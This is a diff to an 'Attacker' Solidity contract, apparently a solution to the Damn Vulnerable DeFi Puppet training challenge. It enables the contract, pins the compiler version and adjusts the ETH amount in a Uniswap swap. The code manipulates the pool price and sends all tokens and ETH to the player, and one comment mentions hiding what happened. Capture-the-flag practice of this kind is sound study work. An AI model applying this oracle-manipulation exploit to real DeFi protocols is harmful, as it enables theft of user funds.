@@ -1,6 +1,5 @@
-/*
 // SPDX-License-Identifier: MIT
-pragma solidity ^0.8.0;
+pragma solidity 0.8.23;
 
 import { PuppetPool } from "./PuppetPool.sol";
 import { DamnValuableToken } from "../DamnValuableToken.sol";
@@ -38,7 +37,7 @@ contract Attacker {
 
         // ethToTokenSwapOutput: {msg.value max ETH, tokens_bought, deadline}
         // Optional: Return the uniswap pool back to normal state in attempt to obfuscate what happened. (futile).
-        _uniswapPair.call{value: 9.901 ether}(abi.encodeWithSignature("ethToTokenSwapOutput(uint256,uint256)", playerAmount, type(uint256).max));
+        _uniswapPair.call{value: 10 ether}(abi.encodeWithSignature("ethToTokenSwapOutput(uint256,uint256)", playerAmount, type(uint256).max));
 
         // transfer all the tokens and ETH from this contract to the player.
         token.transfer(msg.sender, token.balanceOf(address(this)));
@@ -54,4 +53,3 @@ contract Attacker {
         token.approve(_uniswapPair, amount);
     }
 }
-*/
